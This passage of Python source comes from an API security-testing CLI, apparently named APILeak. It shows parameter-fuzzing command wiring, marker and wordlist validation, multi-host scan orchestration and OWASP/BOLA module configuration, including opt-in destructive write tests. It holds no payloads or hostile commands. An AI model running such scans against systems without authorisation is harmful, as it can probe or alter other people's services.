@click.option('--fuzz-mode', 'fuzz_mode',
              type=click.Choice(['clusterbomb', 'pitchfork'], case_sensitive=False),
              default='clusterbomb', show_default=True,
              help='Combination strategy for multiple markers (Marker_Mode).')
@concurrency_options
@click.option('--confirm-hits', 'confirm_hits', type=int, default=None, callback=_validate_confirm_hits,
              metavar='N',
              help='Enable Hit_Confirmation: re-request each interesting candidate N times '
                   'and record it only when the responses are consistent (must be >= 1; '
                   'default: off).')
@resilience_options
@request_context_options
@matcher_filter_options
@machine_output_options
@tls_options
@click.pass_context
def par(ctx, target, target_file, max_hosts, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, fuzz_keyword, fuzz_mode, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework, proxy, proxy_verify_ssl, concurrency, confirm_hits, max_requests, timeout, retries, header, cookie, basic_auth, match_size, match_words, match_lines, match_regex, match_time, filter_size, filter_words, filter_lines, filter_regex, filter_time, output_format, output_file, client_cert, ca_bundle, resolve):
    """Parameter fuzzing - discover hidden parameters in API endpoints

    \b
    Examples:
      python apileaks.py par --target https://api.example.com/users/123
      python apileaks.py par --target URL --jwt TOKEN --wordlist params.txt
      python apileaks.py par --target URL --user-agent-random --rate-limit 3
      python apileaks.py par --target-file hosts.txt --wordlist params.txt
    """
    # -------------------------------------------------------------------------
    # Multi-target resolution for par — mirrors the dir command's logic.
    # -------------------------------------------------------------------------
    if target_file:
        try:
            file_targets = parse_target_file(target_file)
        except click.BadParameter as exc:
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)
        if not file_targets:
            click.echo(
                f"Error: --target-file '{target_file}' contains no valid targets.",
                err=True,
            )
            sys.exit(1)
        if target:
            all_targets = [target] + [t for t in file_targets if t != target]
        else:
            all_targets = file_targets
        if max_hosts is not None and max_hosts > 0:
            all_targets = all_targets[:max_hosts]
    elif target:
        all_targets = [target]
    else:
        click.echo(
            "Error: Either --target or --target-file must be supplied.\n"
            "  --target URL            fuzz parameters on a single endpoint\n"
            "  --target-file FILE      fuzz each endpoint listed in FILE",
            err=True,
        )
        sys.exit(1)

    # Forward shared kwargs so the multi-target helper can call par_core per host.
    _par_kwargs = {
        'wordlist': wordlist, 'output': output, 'log_level': log_level, 'log_file': log_file,
        'json_logs': json_logs, 'rate_limit': rate_limit, 'methods': methods,
        'fuzz_keyword': fuzz_keyword, 'fuzz_mode': fuzz_mode,
        'user_agent_random': user_agent_random, 'user_agent_custom': user_agent_custom,
        'user_agent_file': user_agent_file, 'jwt': jwt, 'response': response,
        'status_code': status_code, 'detect_framework': detect_framework,
        'proxy': proxy, 'proxy_verify_ssl': proxy_verify_ssl, 'concurrency': concurrency,
        'confirm_hits': confirm_hits, 'max_requests': max_requests, 'timeout': timeout,
        'retries': retries, 'header': header, 'cookie': cookie, 'basic_auth': basic_auth,
        'match_size': match_size, 'match_words': match_words, 'match_lines': match_lines,
        'match_regex': match_regex, 'match_time': match_time, 'filter_size': filter_size,
        'filter_words': filter_words, 'filter_lines': filter_lines,
        'filter_regex': filter_regex, 'filter_time': filter_time,
        'output_format': output_format, 'output_file': output_file,
        'client_cert': client_cert, 'ca_bundle': ca_bundle, 'resolve': resolve,
    }

    if len(all_targets) > 1:
        _run_par_multi_target(all_targets, ctx=ctx, **_par_kwargs)
        return

    target = all_targets[0]

    # Legacy `par` option audit (Requirements 2.5, 2.6).
    #
    # Every legacy `par` option present before the `dir`-parity work is RETAINED
    # here with its original semantics (R2.5): --target, --wordlist (now also
    # repeatable, backward-compatible with a single value), --output, --log-level,
    # --log-file, --json-logs, --rate-limit, --methods, --user-agent-random/
    # --user-agent-custom/--user-agent-file, --jwt, --response, --status-code,
    # --detect-framework/--df, --proxy, and --proxy-verify-ssl are all accepted
    # without terminating execution. The parity options added by tasks 11.1-11.5
    # (request-context, resilience, concurrency, TLS, matcher/filter,
    # machine-output, --confirm-hits) are purely ADDITIVE and each mirrors the
    # option `dir` already exposes, so no legacy single-purpose flag was replaced
    # or superseded. `--methods` was previously accepted but ignored ("not used");
    # it is now wired to real injection-point semantics (R6), an enhancement of a
    # retained option rather than a deprecation.
    #
    # Consequently there are NO deprecated `par` options: no deprecation notice is
    # emitted because none is warranted (R2.6 is conditional on a deprecated
    # option existing). Should a `par` option ever be superseded in future, emit a
    # non-terminating notice via `_emit_deprecation_notice(<option>, <replacement>)`
    # (the same helper `full`/`main` use), which writes to stderr and leaves
    # stdout and the exit code unchanged.

    # Validate user agent options
    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)

    # Validate basic-auth conflicts/format before any parameter fuzzing runs so a
    # --basic-auth + --jwt conflict (Requirement 7.7) or a colon-less value
    # (Requirement 7.6) exits before any request is issued, identical to `dir`.
    validate_basic_auth_options(basic_auth, jwt)

    # Validate custom-header format before any parameter fuzzing runs so a
    # colon-less --header value (Requirement 7.5) is rejected with a descriptive
    # error naming the malformed header and exits before any request is issued.
    validate_header_options(header)

    # Setup logging
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    logger = get_logger("par")

    logger.info("APILeak parameter fuzzing starting", version=APILEAK_VERSION, target=target)

    # Build --match-*/--filter-* expressions into the '<attribute>:<expression>'
    # grammar understood by parse_selectors, reusing `dir`'s selector plumbing
    # verbatim (Requirement 12.7). Status matching continues to use the existing
    # --status-code flag, so it is intentionally not included here.
    match_exprs = (
        [f"size:{expr}" for expr in match_size]
        + [f"words:{expr}" for expr in match_words]
        + [f"lines:{expr}" for expr in match_lines]
        + [f"regex:{expr}" for expr in match_regex]
        + [f"time:{expr}" for expr in match_time]
    )
    filter_exprs = (
        [f"size:{expr}" for expr in filter_size]
        + [f"words:{expr}" for expr in filter_words]
        + [f"lines:{expr}" for expr in filter_lines]
        + [f"regex:{expr}" for expr in filter_regex]
        + [f"time:{expr}" for expr in filter_time]
    )

    # Parse selectors at CLI parse time so a syntactically invalid matcher/filter
    # expression is surfaced as a descriptive CLI error and NO parameter fuzzing
    # request is issued (Requirement 12.4), consistent with `dir`. The parsed
    # matchers/filters are threaded into the finding-selection pipeline by a
    # later task; parsing here guarantees the exit-before-request behavior.
    try:
        matchers, filters = parse_selectors(match_exprs, filter_exprs)
    except SelectorError as exc:
        logger.error("Invalid response selector expression", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)

    try:
        # Prepare user agent configuration
        user_agent_config = None
        if user_agent_random:
            user_agent_config = {'random': True}
        elif user_agent_custom:
            user_agent_config = {'custom': user_agent_custom}
        elif user_agent_file:
            user_agents = load_user_agents_from_file(user_agent_file)
            user_agent_config = {'file_list': user_agents}

        # Prepare output filename
        output_filename = prepare_output_filename(output)

        # Prepare advanced configuration for parameter fuzzing
        advanced_config = {
            'detect_framework': detect_framework,
            'fuzz_versions': False,  # Version fuzzing not typically useful for parameter mode
            'framework_confidence': 0.6  # Default confidence for par mode
        }

        # Parse status code filter for HTTP output
        status_code_filter = parse_status_codes(status_code) if status_code else None

        # Parse operator-supplied request-context headers, cookie, and basic-auth
        # reusing `dir`'s helpers verbatim (Requirements 7.1-7.3). The cookie is
        # carried as a 'Cookie' header so it rides the same custom_headers path as
        # --header (Requirement 7.2).
        extra_headers = parse_header_options(header)
        if cookie:
            extra_headers['Cookie'] = cookie
        basic_auth_creds = parse_basic_auth(basic_auth)

        # ------------------------------------------------------------------ #
        # Marker-mode validation (Requirements 1.5, 1.6, 2.3, 5.1, 7.4,   #
        # 7.5, 7.6, 10.1–10.7), strictly exit-before-request.              #
        # Mirrors the dir command marker-validation block verbatim but      #
        # threads into config_dict['fuzzing']['parameters'].                #
        # ------------------------------------------------------------------ #
        marker_only_requested = (
            ctx.get_parameter_source('fuzz_keyword')
            == click.core.ParameterSource.COMMANDLINE
            or ctx.get_parameter_source('fuzz_mode')
            == click.core.ParameterSource.COMMANDLINE
        )
        marker_wordlists = None
        try:
            # 1. Keyword validity (R1.5 / R10.1).
            resolved_fuzz_keyword = validate_fuzz_keyword(fuzz_keyword)

            # 2. Marker presence for marker-only mode (R1.6 / R10.2).
            markers = find_markers(target, resolved_fuzz_keyword)
            if not markers and marker_only_requested:
                raise ValueError(
                    "no Fuzz_Marker found in target URL "
                    f"{target!r} for keyword {resolved_fuzz_keyword!r}"
                )

            # 3. Fuzz-mode selection (R5.1 / R10.3).
            resolved_fuzz_mode = parse_fuzz_mode(fuzz_mode)

            if markers:
                # 4. Associate wordlists with markers in left-to-right order
                #    (R7.1–R7.4 / R10.4). Each --wordlist source is wrapped so
                #    associate_wordlists operates on source references.
                wordlist_sources = [[src] for src in wordlist]
                if not wordlist_sources:
                    # R7.7: no --wordlist supplied → default parameter wordlist
                    # covers every marker position.
                    wordlist_sources = [[DEFAULT_PARAMETER_WORDLIST]]
                associated_sources = associate_wordlists(markers, wordlist_sources)

                # 5. Read each associated wordlist (R7.6 / R10.6).
                marker_wordlists = []
                for assoc in associated_sources:
                    source = assoc[0]
                    try:
                        marker_wordlists.append(_read_wordlist_entries(source))
                    except OSError as exc:
                        raise ValueError(
                            f"unreadable wordlist source '{source}': {exc}"
                        ) from exc

                # 6. Pitchfork empty-wordlist check (R7.5 / R10.5).
                if resolved_fuzz_mode == FuzzMode.PITCHFORK:
                    for marker, entries in zip(markers, marker_wordlists, strict=False):
                        if not entries:
                            raise ValueError(
                                "Pitchfork_Mode requires a non-empty wordlist for "
                                "every marker; the wordlist for marker at order "
                                f"{marker.order} is empty"
                            )
        except ValueError as exc:
            logger.error("Invalid marker-mode configuration", error=str(exc))
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)

        # In Name_Discovery_Mode (no markers, no marker-only option) resolve
        # the merged, de-duplicated candidate parameter set from the repeatable
        # --wordlist sources BEFORE any request.  This path is gated on
        # marker_wordlists is None so Marker_Mode never runs it (R2.1).
        candidate_parameters = None
        if marker_wordlists is None:
            # Resolve the merged, de-duplicated candidate parameter set from the
            # repeatable --wordlist sources BEFORE any request, reusing `dir`'s
            # wordlist-reading helper. An unreadable source is surfaced as a
            # descriptive error naming the file and stops before any request
            # (Requirement 10.3). When --wordlist is omitted the default
            # wordlists/parameters.txt is used (Requirement 10.4).
            try:
                candidate_parameters = _resolve_par_candidates(wordlist)
            except ValueError as exc:
                logger.error("Unreadable parameter wordlist", error=str(exc))
                click.echo(f"Error: {exc}", err=True)
                sys.exit(1)

            # An empty merged candidate set completes WITHOUT issuing any request
            # and reports that no candidate parameters were available (R10.5).
            if not candidate_parameters:
                click.echo(
                    "No candidate parameters available: no wordlist entries to fuzz."
                )
                return

        # Create default configuration for parameter fuzzing. The wordlist file
        # path is left at its default; the merged candidate set below overrides
        # the file-based wordlists via query_candidates/body_candidates.
        #
        # The transversal transport/TLS options (--client-cert/--ca-bundle/
        # --resolve) and the parameter-fuzzing controls (--methods, --confirm-hits,
        # --max-requests, and the merged query/body candidate sets) are threaded
        # THROUGH create_default_config so the `par` wiring is centralized in the
        # config-creation path — mirroring how the transversal keys are
        # centralized there — rather than being patched onto config_dict inline.
        # The CLI validators have already parsed/validated each of these before
        # any request is issued (Requirements 5.1, 6.1, 9.1-9.3, 10.1, 10.2, 11.1).
        #
        # In Marker_Mode: query_candidates/body_candidates are None (name-discovery
        # path is skipped); fuzz_keyword, fuzz_mode, marker_wordlists are threaded.
        # In Name_Discovery_Mode: marker_wordlists is None (marker gate stays off).
        config_dict = create_default_config(
            target, None, "par", user_agent_config, output_filename,
            advanced_config, status_code_filter, extra_headers, basic_auth_creds,
            client_cert=client_cert, ca_bundle=ca_bundle, resolve=resolve,
            parameter_methods=methods, confirm_hits=confirm_hits,
            parameter_max_requests=max_requests,
            query_candidates=candidate_parameters,
            body_candidates=candidate_parameters,
            fuzz_keyword=resolved_fuzz_keyword,
            fuzz_mode=resolved_fuzz_mode.value,
            marker_wordlists=marker_wordlists,
        )
        config_dict['proxy'] = proxy
        config_dict['proxy_verify_ssl'] = proxy_verify_ssl

        # Apply CLI overrides
        if rate_limit:
            config_dict['rate_limiting']['requests_per_second'] = rate_limit
        # Thread the per-request resilience and concurrency controls into the
        # config exactly as `dir` does (Requirement 8). --timeout becomes the
        # target read timeout (8.1), --retries becomes the RetryConfig source
        # (8.2), and --concurrency limits in-flight requests (8.3). Each falls
        # back to the config defaults when not supplied (8.6). These stay inline
        # here (as they do in `dir`) since they are shared fuzzing/target keys,
        # not part of the centralized par-path threading above.
        if timeout is not None:
            config_dict['target']['timeout'] = timeout
        if retries is not None:
            config_dict['fuzzing']['retries'] = retries
        if concurrency is not None:
            config_dict['fuzzing']['concurrency'] = concurrency
        if jwt:
            config_dict['authentication']['contexts'][0]['token'] = jwt
            config_dict['authentication']['contexts'][0]['type'] = 'bearer'
        if response:
            config_dict['fuzzing']['response_filter'] = parse_response_codes(response)

        # Thread the parsed response matchers/filters into the shared FuzzingConfig
        # fields so parameter findings are narrowed by the SAME matcher-before-filter
        # pipeline `dir` uses: retain only findings satisfying every matcher, then
        # exclude any finding satisfying any filter (Requirements 12.1-12.3). The
        # selectors were already parsed above at CLI time (exit-before-request on an
        # invalid expression, Requirement 12.4); here they flow through to the
        # engine's finding-selection step. When no selectors were supplied both
        # lists are empty and selection is a no-op.
        config_dict['fuzzing']['matchers'] = matchers
        config_dict['fuzzing']['filters'] = filters

        # Thread the machine-readable output selections (--output-format/
        # --output-file) into the shared FuzzingConfig so the engine writes the
        # selected parameter findings (including their detection-signal fields)
        # through the same CSV/JSON Lines machine writer `dir` uses
        # (Requirements 12.5, 12.6). --output-format is already constrained to
        # csv/jsonl by click.Choice at parse time, so an unsupported format is
        # rejected before any request and no file is written (Requirement 12.6).
        # When neither option is supplied both stay None and no machine output
        # is written, leaving the default report behavior unchanged.
        config_dict['fuzzing']['output_format'] = output_format
        config_dict['fuzzing']['output_file'] = output_file

        # Load configuration through ConfigurationManager
        config_manager = ConfigurationManager()
        apileak_config = config_manager.load_config_from_dict(config_dict)

        # Validate configuration
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)

        # Run the scan
        asyncio.run(run_enhanced_apileak(apileak_config))

    except Exception as e:
        logger.error("Parameter fuzzing failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


# ---------------------------------------------------------------------------
# Shared execution core (design §6). ``_build_and_run`` centralizes the config
# assembly + dispatch that the legacy ``full`` handler performs inline,
# parameterized by the selected OWASP module set. Both the generated
# ``owasp <module>`` subcommands (task 6) and the ``scan`` orchestrator (task 7)
# call it, so a single-module run and a composed run build a byte-identical
# APILeakConfig for that module (Property 5). This function is CLI-surface only:
# it assembles config and dispatches to the UNCHANGED engine path
# (``run_enhanced_apileak`` -> ``APILeakCore``); it contains no OWASP detection
# logic.
#
# NOTE: this task only ADDS these functions; the live ``full`` command above is
# intentionally left untouched so it keeps working until the orchestrator swap
# in task 7.
# ---------------------------------------------------------------------------


def _require_target_or_config(opts, config_path):
    """Fail before any request when no target and no config file are supplied.

    Mirrors the ``full`` command guard (Requirement 1.5): a Module_Subcommand or
    the Orchestrator_Command invoked without a target and without a ``--config``
    file runs no OWASP module, writes an error to standard error, and exits with
    a nonzero status before any request is issued.

    The requirement is satisfied by the target-resolution precedence
    command-line option -> Environment_Override -> config file: a ``--target``
    option, a ``--target-file`` file, a non-empty ``APILEAK_TARGET``
    Environment_Override, or a ``--config`` file each supply the target, so only
    the complete absence of all four aborts the run (Requirements 1.5, 10.2–10.4).
    """
    if config_path:
        return
    if opts.get('target'):
        return
    if opts.get('target_file'):
        return
    # Environment_Override: a non-empty APILEAK_TARGET satisfies the target
    # requirement when no --target option is supplied (Requirements 10.2, 10.3).
    if os.getenv('APILEAK_TARGET'):
        return
    click.echo(
        "Error: --target or --target-file is required when no config file is provided",
        err=True,
    )
    sys.exit(1)


def _validate_baseline_readable(baseline):
    """Fail before any request when ``--baseline`` names an unreadable file.

    Implements Requirement 5.7: when the ``--baseline`` option references a file
    that exists but is unreadable or not well-formed JSON, the run exits with a
    nonzero status, writes an error naming the baseline file, and runs no
    Severity_Gate against a partial baseline (the scan is aborted before any
    request is issued). A *missing* path is not an error — it is treated as an
    empty baseline so every finding is a New_Finding (documented ``--baseline``
    behavior), matching :meth:`utils.baseline.BaselineComparator.load`.
    """
    if not baseline:
        return
    if not os.path.exists(baseline):
        # A missing path yields an empty baseline (every finding treated as new);
        # this is documented behavior and NOT the malformed/unreadable case.
        return
    try:
        with open(baseline, encoding="utf-8") as handle:
            json.load(handle)
    except (OSError, json.JSONDecodeError) as exc:
        click.echo(
            f"Error: --baseline file '{baseline}' is unreadable or malformed: {exc}",
            err=True,
        )
        sys.exit(1)


def _collect_module_configs(descriptors, opts):
    """Collect per-module PRE-load config sub-dicts for ``create_enhanced_config``.

    Returns a mapping of ``OWASPConfig`` field name -> config-values dict for
    modules that must influence config construction before the config object is
    built (i.e. threaded into the ``config_dict`` handed to
    ``ConfigurationManager.load_config_from_dict``).

    The ``bola`` module is threaded pre-load here — reproducing the exact
    ``bola_config`` assembly the legacy ``full`` command performed — so that the
    constructed ``config_dict`` carries the BOLA settings (Requirements 34.3,
    34.4). Its descriptor's ``apply_options`` re-applies the same values POST-load
    in ``_build_and_run`` (idempotently), which additionally covers the
    file-config path where ``create_enhanced_config`` is not called. Modules that
    only apply post-load (e.g. ``auth``) are omitted here. The mapping is keyed
    only for descriptors actually selected for this run, so an ``owasp <module>``
    subcommand threads only its own module's pre-load config.
    """
    module_configs = {}
    for desc in descriptors:
        if desc.key == "bola":
            # Reproduce the legacy ``full`` bola_config assembly: every boolean
            # flag defaults off, and --bola-destructive-methods is parsed from a
            # comma-separated string into an uppercased set. The destructive
            # methods key is only threaded when supplied so the BOLAConfig default
            # {PATCH, PUT} otherwise applies (Requirement 34.4).
            raw_methods = opts.get('bola_destructive_methods')
            bola_testing = {
                'allow_destructive': opts.get('allow_write_bola', False),
                'enable_composite': opts.get('bola_composite', False),
                'enable_id_leakage': opts.get('bola_id_leakage', False),
                'verb_tampering': opts.get('bola_verb_tampering', False),
                'parameter_pollution': opts.get('bola_parameter_pollution', False),
                'dry_run': opts.get('bola_dry_run', False),
            }
            if raw_methods:
                bola_testing['destructive_methods'] = {
                    m.strip().upper() for m in raw_methods.split(',') if m.strip()
                }
            module_configs['bola_testing'] = bola_testing
    return module_configs


def _apply_transversal_overrides(cfg, opts, parsed_auth_contexts):
    """Apply every Transversal_Option override onto a loaded config object.

    Lifts the verbatim post-load override logic from the ``full`` handler so a
    Module_Subcommand and the Orchestrator_Command apply identical transversal
    effects on the run configuration (Requirements 3.5, 5.4). Works for both
    file-loaded and in-memory configs. Each override is applied only when its
    option is supplied so a file config's values are preserved when a flag is
    absent.

    Args:
        cfg: The loaded ``APILeakConfig`` to mutate in place.
        opts: Collected Click option values (keyed by option dest name).
        parsed_auth_contexts: The ``--auth-context`` values parsed up front into
            ``AuthContext`` objects (parsed before any request in
            ``_build_and_run``).
    """
    logger = get_logger("build_and_run")

    # --- target (CLI overrides config file) — mirrors merge_cli_overrides ---
    if opts.get('target') and hasattr(cfg, 'target'):
        cfg.target.base_url = opts['target']

    # --- rate limit — mirrors merge_cli_overrides ---
    if opts.get('rate_limit') and hasattr(cfg, 'rate_limiting'):
        cfg.rate_limiting.requests_per_second = opts['rate_limit']

    # --- jwt: historically threaded as a CLI override key ('jwt_token') that
    #     merge_cli_overrides does not consume, so it is a no-op on the run
    #     configuration. Preserved as a no-op here to avoid changing behavior;
    #     authenticated identities are supplied through --auth-context.

    # --- safe mode (CLI flag overrides config; Requirement 5.4) ---
    if opts.get('safe_mode') and hasattr(cfg, 'safe_mode'):
        cfg.safe_mode = True

    # --- proxy / proxy-verify-ssl (CLI flag overrides config) ---
    if opts.get('proxy') and hasattr(cfg, 'proxy'):
        cfg.proxy = opts['proxy']
        cfg.proxy_verify_ssl = opts.get('proxy_verify_ssl', False)

    # --- SARIF report format ---
    if opts.get('sarif') and hasattr(cfg, 'reporting'):
        if 'sarif' not in cfg.reporting.formats:
            cfg.reporting.formats.append('sarif')

    # --- multi-user auth contexts (appended to the existing anonymous context) ---
    if parsed_auth_contexts and hasattr(cfg, 'authentication'):
        cfg.authentication.contexts.extend(parsed_auth_contexts)
        logger.info(
            "Threaded multi-user auth contexts into OWASP modules",
            context_count=len(parsed_auth_contexts),
        )

    # --- discovery recursion / budget / concurrency / resilience controls ---
    fuzzing = getattr(cfg, 'fuzzing', None)
    if fuzzing is not None:
        depth = opts.get('depth')
        # max_depth precedence: CLI --depth > APILEAK_MAX_DEPTH > config/default.
        # Only override when --depth is supplied or the env var is set so a file
        # config's max_depth is preserved otherwise (Requirements 17.6-17.8).
        if depth is not None:
            fuzzing.max_depth = resolve_max_depth(depth)
        elif os.getenv('APILEAK_MAX_DEPTH') is not None:
            fuzzing.max_depth = resolve_max_depth(None)
        if opts.get('recursive') is not None:
            fuzzing.recursive = opts['recursive']
        if depth == 0:
            fuzzing.recursive = False  # depth 0 => depth-0 pass only (17.3)
        if opts.get('max_requests') is not None:
            fuzzing.max_requests = opts['max_requests']
        if opts.get('concurrency') is not None:
            fuzzing.concurrency = opts['concurrency']
        if opts.get('retries') is not None:
            fuzzing.retries = opts['retries']
        # Extensions: only override when supplied so a file config's extensions
        # are preserved when the flag is absent. Values are comma-separated AND
        # repeatable: split each on commas, flatten, then normalize.
        if opts.get('extensions'):
            fuzzing.endpoints.extensions = normalize_extensions(
                [ext for value in opts['extensions'] for ext in value.split(',')]
            )
        # Recursion_Scope: only set when parsed from supplied flags so a file
        # config's scope is preserved otherwise (Requirements 34.3, 34.4).
        recursion_scope = opts.get('recursion_scope')
        if recursion_scope is not None:
            fuzzing.recursion_scope = recursion_scope

    # --- per-request timeout (target read timeout; Requirement 28.1) ---
    if opts.get('timeout') is not None and hasattr(cfg, 'target'):
        cfg.target.timeout = opts['timeout']


def _run_scan_multi_target(ctx, *, targets, selected_keys, descriptors,
                           config_path=None, **opts_overrides):
    """Run an orchestrated OWASP scan over multiple targets sequentially.

    Iterates ``targets``, calling ``_build_and_run`` for each with the target
    injected into ``opts`` and interactive triage suppressed. Prints a
    consolidated one-line-per-host result table at the end.

    Args:
        ctx:            Click context (forwarded to each ``_build_and_run`` call).
        targets:        Ordered list of target URL strings.
        selected_keys:  OWASP module keys to enable (forwarded unchanged).
        descriptors:    Module descriptor objects (forwarded unchanged).
        config_path:    Optional config file path (forwarded unchanged).
        **opts_overrides: All Click option values for the scan/full command.
    """
    _RESET  = "\033[0m"
    _BOLD   = "\033[1m"
    _GREEN  = "\033[92m"
    _RED    = "\033[91m"
    _CYAN   = "\033[96m"

    total = len(targets)
    click.echo(
        f"\n{_BOLD}{_CYAN}Multi-target OWASP scan: {total} host(s){_RESET}\n"
        f"{'─' * 60}"
    )

    from urllib.parse import urlparse as _urlparse

    summaries = []
    for idx, t in enumerate(targets, 1):
        hostname = _urlparse(t).netloc or t
        click.echo(f"\n{_BOLD}[{idx}/{total}]{_RESET} {_CYAN}{t}{_RESET}")

        # Build per-target opts: inject the resolved target, suppress interactive.
        per_opts = dict(opts_overrides)
        per_opts["target"] = t
        per_opts["target_file"] = None    # don't recurse into file
        per_opts["max_hosts"] = None

        # Derive a per-host output filename so reports don't overwrite each other.
        base_output = per_opts.get("output")
        if base_output:
            per_opts["output"] = f"{base_output}_{hostname.replace(':', '_')}"
        else:
            safe = hostname.replace(":", "_").replace("/", "_")
            per_opts["output"] = f"scan_{safe}"

        error_msg = None
        try:
            _build_and_run(
                ctx,
                selected_keys=selected_keys,
                descriptors=descriptors,
                opts=per_opts,
                config_path=config_path,
            )
            click.echo(f"  {_GREEN}✓ Scan completed{_RESET}")
        except SystemExit as exc:
            # _build_and_run calls sys.exit on validation / config errors.
            error_msg = f"exited with code {exc.code}"
            click.echo(f"  {_RED}✗ {error_msg}{_RESET}")
        except Exception as exc:
            error_msg = str(exc)
            click.echo(f"  {_RED}✗ {error_msg}{_RESET}")

        summaries.append({
            "hostname": hostname,
            "target": t,
            "error": error_msg,
        })

    # Consolidated summary table
    col = 50
    click.echo(
        f"\n{_BOLD}{_CYAN}{'═' * 60}\n  MULTI-TARGET SCAN SUMMARY  ({total} hosts)\n"
        f"{'═' * 60}{_RESET}"
    )
    click.echo(f"{_BOLD}{'HOST':<{col}} {'STATUS'}{_RESET}")
    click.echo("─" * 65)
    success_count = error_count = 0
    for s in summaries:
        h = s["hostname"][:col - 1] if len(s["hostname"]) >= col else s["hostname"]
        if s["error"]:
            error_count += 1
            click.echo(f"{h:<{col}} {_RED}ERROR — {s['error'][:30]}{_RESET}")
        else:
            success_count += 1
            click.echo(f"{h:<{col}} {_GREEN}OK{_RESET}")
    click.echo("─" * 65)
    click.echo(
        f"\n{_BOLD}Total:{_RESET} {total}  "
        f"{_GREEN}Success: {success_count}{_RESET}  "
        f"{_RED}Errors: {error_count}{_RESET}\n"
    )


def _build_and_run(ctx, *, selected_keys, descriptors, opts, config_path=None):
    """Shared execution core for the ``owasp`` subcommands and the ``scan`` command.

    Centralizes the config assembly + dispatch that the legacy ``full`` handler
    performed inline, parameterized by the selected module set. A single
    Module_Subcommand and ``scan --modules <that-one>`` flow through the same
    steps 2-5 with the same option values, so they build a byte-identical
    ``APILeakConfig`` for that module — differing only in ``enabled_modules``
    cardinality (Property 5 / Requirement 4.3).

    Setting-resolution precedence is preserved (command-line option ->
    environment override -> config file -> built-in default): CLI overrides are
    applied last onto the loaded config, env fallbacks live in
    ``create_enhanced_config`` / ``resolve_max_depth``, and file settings are
    loaded by ``ConfigurationManager`` (Requirements 10.1-10.5).

    Args:
        ctx: The Click context (parity with the command handlers).
        selected_keys: Ordered engine module keys to enable for this run.
        descriptors: The ``OwaspModuleDescriptor`` objects for ``selected_keys``.
        opts: Collected Click option values (transversal + any module-specific).
        config_path: Optional ``--config`` file path; when given, run settings are
            loaded from it instead of built in memory.

    Requirements: 1.3, 1.5, 3.5, 3.6, 4.3, 5.4, 10.1, 10.2, 10.3, 10.4, 10.5
    """
    # --- 1. Pre-flight validation (each fails before any request is issued) ---
    # 1a. Mutually-exclusive User-Agent options (Requirement 3.6).
    validate_user_agent_options(
        opts.get('user_agent_random'),
        opts.get('user_agent_custom'),
        opts.get('user_agent_file'),
    )

    setup_logging(
        level=opts.get('log_level', 'WARNING'),
        json_logs=opts.get('json_logs', False),
        log_file=opts.get('log_file'),
    )
    logger = get_logger("build_and_run")
    logger.info(
        "APILeak scan starting",
        version=APILEAK_VERSION,
        ci_mode=opts.get('ci_mode', False),
        modules=list(selected_keys),
    )

    # 1b. Parse --auth-context up front so a value missing the ':' separator is
    #     rejected with a descriptive click.BadParameter BEFORE any request.
    parsed_auth_contexts = parse_auth_context_option(opts.get('auth_context') or ())

    # 1c. Parse the Recursion_Scope up front so an unrecognized status class or
    #     endpoint type aborts with a descriptive error BEFORE any discovery.
    try:
        recursion_scope = parse_recursion_scope(
            opts.get('recursion_status'), opts.get('recursion_type'))
    except RecursionScopeError as exc:
        logger.error("Invalid discovery scope value", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    opts['recursion_scope'] = recursion_scope

    # 1d. Target-or-config requirement (Requirement 1.5).
    _require_target_or_config(opts, config_path)

    # 1d-bis. Multi-target resolution: if --target-file was supplied, expand
    #     the full list of targets and run each one sequentially via
    #     _run_scan_multi_target. This mirrors the dir command's multi-target
    #     behavior. When --target-file is absent, this block is a no-op and the
    #     single-target path below proceeds unchanged.
    target_file = opts.get('target_file')
    if target_file:
        try:
            file_targets = parse_target_file(target_file)
        except click.BadParameter as exc:
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)
        if not file_targets:
            click.echo(
                f"Error: --target-file '{target_file}' contains no valid targets.",
                err=True,
            )
            sys.exit(1)
        # Merge explicit --target (if any) as the first entry.
        explicit_target = opts.get('target')
        if explicit_target:
            all_targets = [explicit_target] + [
                t for t in file_targets if t != explicit_target
            ]
        else:
            all_targets = file_targets
        max_hosts = opts.get('max_hosts')
        if max_hosts is not None and max_hosts > 0:
            all_targets = all_targets[:max_hosts]
        _run_scan_multi_target(
            ctx,
            targets=all_targets,
            selected_keys=selected_keys,
            descriptors=descriptors,
            config_path=config_path,
            **{k: v for k, v in opts.items()
               if k not in ('target_file', 'max_hosts')},
        )
        return

    # 1d-ter. Baseline readability (Requirement 5.7): an existing but unreadable
    #     or malformed --baseline file aborts nonzero BEFORE any request, so no
    #     Severity_Gate is ever run against a partial baseline. A missing path is
    #     allowed (treated as an empty baseline downstream).
    _validate_baseline_readable(opts.get('baseline'))

    # 1e. Parse the --actor-profile source up front so a missing/unreadable/
    #     unparseable Actor_Profile source is rejected with a descriptive
    #     click.BadParameter naming the source and the scan aborts BEFORE any
    #     request is issued (Requirement 54.5). No-op when the option is absent
    #     (e.g. on the owasp subcommands, which do not expose it).
    actor_profiles = {}
    if opts.get('actor_profile'):
        try:
            actor_profiles = load_actor_profiles(opts['actor_profile'])
        except ValueError as exc:
            raise click.BadParameter(str(exc)) from exc

    # 1f. Parse the --unauthorized-assertions source up front (like
    #     --actor-profile) so a missing/unreadable/unparseable source, or a
    #     pattern that fails to compile, is rejected with a descriptive
    #     click.BadParameter naming the source BEFORE any request (Requirement
    #     55.1). No-op when the option is absent.
    unauthorized_endpoint_assertions = {}
    if opts.get('unauthorized_assertions'):
        try:
            unauthorized_endpoint_assertions = load_unauthorized_assertions(
                opts['unauthorized_assertions'])
        except ValueError as exc:
            raise click.BadParameter(str(exc)) from exc

    # 1g. Parse the repeatable --openapi / --postman Spec_Sources into one merged
    #     Spec_Schema up front so an unreadable or unparseable source is surfaced
    #     as a descriptive CLI error naming the offending Spec_Source and the
